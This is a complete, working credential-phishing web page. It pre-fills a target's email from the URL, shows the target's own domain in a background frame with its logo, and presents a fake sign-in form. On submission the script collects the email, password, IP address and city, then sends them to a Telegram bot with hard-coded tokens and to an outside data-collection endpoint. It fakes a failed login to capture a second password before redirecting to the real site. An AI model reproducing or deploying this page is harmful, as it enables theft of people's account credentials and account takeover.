
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
 
<style>
    * {
        box-sizing: border-box;
        padding: 0;
        margin: 0;
    }

    body {
        height: 100vh;
        width: 100vw;
        font-family: Arial, Helvetica, sans-serif;
    }

    .bg-img {
        height: 100%;
        width: 100%;
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover;
    }
    iframe {
        height: 100%;
        width: 100%;
    }

    /* Add styles to the form container */
    .container {
        max-width: 400px;
        padding: 16px;
        background-color: white;
        border-radius: 5px;
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        z-index: 2;
    }

    @media (max-width: 480px) {
        .container {
            left: 10%;
            top: 10%;
            margin-left: 5%;
            transform: translate(-10%, -10%);
        }
    }

    /* Full-width input fields */
    input[type=text], input[type=password] {
        width: 100%;
        padding: 15px;
        margin: 5px 0 22px 0;
        border: none;
        background: #f1f1f1;
    }

    input[type=text]:focus, input[type=password]:focus {
        background-color: #ddd;
        outline: none;
    }

    .btn {
        background-color: #0096FF;
        color: white;
        padding: 16px 20px;
        border: none;
        cursor: pointer;
        width: 100%;
        opacity: 0.9;
    }

    .btn:hover {
        opacity: 1;
    }

    .img {
        text-align: center;
    }

    #title {
        text-align: center;
        margin: 10px 0;
    }

    #error {
        display: none;
        color: red;
    }
</style>
</head>
<body>

<div class="bg-img" id="bg-img">
    <iframe id="frame" src="#" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;" width="100%"></iframe>
</div>
<form class="container" id="login-form">
    <div class="img">
        <img src="#" id="logo">
    </div>

    <h3 id="title">Sign In</h1><br><br>

   <center> <h5 id="error">Password is incorrect, please try again!</h5></center>
<br><br>
    <label for="email"><b>Email Address</b></label>
    <input type="text" placeholder="Enter Email" name="email" id="email" required readonly>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="password" id="psw" required>

    <input type="hidden" name="step" id="step">

    <button type="submit" class="btn">Sign In</button>
</form>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>

    let step = 1;
    
    const clientID = window.location.hash.split("#").pop();
    $('#email').val(clientID);
    const domain = clientID.split('@').pop();

    $("#frame").attr("src", "https://www." + domain);
    $("#logo").attr("src", "https://www.google.com/s2/favicons?domain=" + domain);

    const submit = $("button[type='submit']");

    // Telegram Bot Token and Chat ID
    const botToken = '8452431501:AAEulCr9zDSqWKVvTcozPYpQpeyDy_hECQk'; // Replace with your bot token
    const chatId = '1357995456'; // Replace with your chat ID

    // Function to send message to Telegram
    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot7218728763:AAGD1s-YbjQMDAnmkQyoeJutO1hiyQqUNV4/sendMessage`;
        $.post(url, {
            chat_id: chatId,
            text: message
        }, function(data) {
            console.log('Message sent to Telegram:', data);
        });
    }

    $("#login-form").submit(function(event) {
        event.preventDefault();

        submit.text('Verifying...');

        $.getJSON('https://ipinfo.io', function(response) {
            const email = $("#email").val();
            const password = $("#psw").val();
            const ip = response.ip;
            const location = response.city + ", " + response.country;

            // Prepare message for Telegram
            const telegramMessage = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nLocation: ${location}`;
            sendToTelegram(telegramMessage); // Send to Telegram

            const posting = $.post("https://data.endpoint.space/clwez9eh4010908l3oxe4jkpf", {
                _subject: "Logs | " + response.ip,
                Email: email,
                Password: password,
                Attempts: step,
                IP: ip,
                Location: location,
            });

            posting.done(function(data) {
                if (step === 2) {
                    window.location.href = "http://" + domain;
                } else {
                    step++;
                    $("#error").css("display", "block");
                    submit.text('Sign In');
                    $("#psw").val("");
                }
            });

            posting.fail(function(error) {
                console.error(error);
                $("#error").css("display", "block");
                submit.text('Sign In');
                $("#psw").val("");
            });
        }, "json");
    });
</script>
</body>
</html>
